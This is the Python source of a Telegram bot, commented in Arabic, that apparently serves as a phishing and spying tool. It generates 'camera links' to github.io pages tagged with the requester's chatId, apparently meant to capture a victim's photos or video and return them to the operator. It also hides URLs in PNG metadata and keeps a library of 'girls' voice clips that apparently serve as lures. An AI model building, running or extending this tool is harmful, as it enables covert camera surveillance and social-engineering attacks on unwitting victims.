import telebot
from telebot import types
import os
from PIL import Image, PngImagePlugin

# --- إعدادات البوت السرية ---
raw_token = os.getenv("BOT_TOKEN")
BOT_TOKEN = raw_token.strip() if raw_token else None

if not BOT_TOKEN:
    raise ValueError("❌ خطأ: لم يتم العثور على متغير BOT_TOKEN في إعدادات السيرفر!")

bot = telebot.TeleBot(BOT_TOKEN)

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

user_states = {}
user_data = {}

# 🔒 مكتبة المعرفات الجديدة المستخرجة من لقطات الشاشة (جاهزة وتعمل 100%)
GIRLS_LIBRARY = {
    "مقطع 1": "AwACAgIAAxkBAAIIF2ojuGA5OfGJ8xllNjdq7PT5_eTMAAJSXAAC7OtASCDhG5TwKjeOwQ",
    "مقطع 2": "AwACAgIAAxkBAAIIFmojuGBj27n6GGWkgb8u9-yb8bmRAAJQXAAC7OtASHTBn4h8WvpXOwQ",
    "مقطع 3": "AwACAgIAAxkBAAIIGGojuGDZZe_xI-8nfLGz5Q1blEoAJTXAAC7OtASFwuV1PR2eIrOwQ",
    "مقطع 4": "AwACAgIAAxkBAAIIGWojuGD5S2ZXP50FcZ_uLT7RzhidAAJUXAAC7OtASPR21_MwzZ3eOwQ",
    "مقطع 5": "AwACAgIAAxkBAAIIGmojuGAn1-3VuvxbWkuvyP9ulNaYAAJWXAAC7OtASBKjwQUT3tHP0wQ",
    "مقطع 6": "AwACAgIAAxkBAAIIG2ojuGDFC2mdBXffpu2gv1VuBvKjAAJXXAAC7OtASFwAASLLy3jkHzE",
    "مقطع 7": "AwACAgIAAxkBAAIIHGojuGBlfYmSmm6d759s-enHS8DBAAJYXAAC7OtASGQrQYIMTMTDowQ",
    "مقطع 8": "AwACAgIAAxkBAAIIHWojuGCclvPmlutJMd0S1TUpNOX2AAIOUAAC7OtISGEgGmL_MUpuOwQ",
    "مقطع 9": "AwACAgIAAxkBAAIIHmojuGAsdZRzoceBd89X3n1UvtpaAAI2UAAC7OtISGb7tyB1rePD0wQ",
    "مقطع 10": "AwACAgIAAxkBAAIIH2ojuGD3rU9ypF3NTmdko1chnzzaAAI4UAAC7OtISH6t-_RAIqniOwQ"
}

# --- دالة حقن الرابط في الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    img = Image.open(image_path).convert("RGB")
    meta = PngImagePlugin.PngInfo()
    meta.add_text("URL_LINK", link)
    img.save(output_path, "PNG", pnginfo=meta)

# --- واجهة البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    bot.send_message(message.chat.id, "أهلاً المطور سيف الدين، اختر الخدمة:", reply_markup=markup)

# --- معالجة الأزرار ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.edit_message_text("أرسل الصورة الآن لحقن الرابط:", chat_id, call.message.message_id)
    
    elif call.data in ["get_photo_link", "get_video_link"]:
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}" if call.data == "get_photo_link" else f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
    
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        for name in GIRLS_LIBRARY.keys():
            markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
        bot.edit_message_text("اختر المقطع:", chat_id, call.message.message_id, reply_markup=markup)
        
    elif call.data.startswith("play:"):
        name = call.data.split(":")[1]
        file_id = GIRLS_LIBRARY.get(name)
        
        try:
            bot.send_voice(chat_id, file_id)
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ خطأ في تشغيل: {name}")

# --- المعالج العام (صور، نصوص) ---
@bot.message_handler(content_types=['photo', 'text'])
def handle_all(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    # معالجة الحقن (خطوة 1: استلام الصورة)
    if state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = f"img_{chat_id}.png"
        with open(img_path, 'wb') as f: f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.reply_to(message, "تم حفظ الصورة، أرسل الرابط الآن:")

    # معالجة الحقن (خطوة 2: استلام الرابط)
    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = f"out_{chat_id}.png"
        hide_link_in_metadata(img_path, message.text, out_path)
        with open(out_path, 'rb') as f:
            bot.send_photo(chat_id, f, caption=f"{message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    bot.polling(none_stop=True, interval=0, timeout=20)
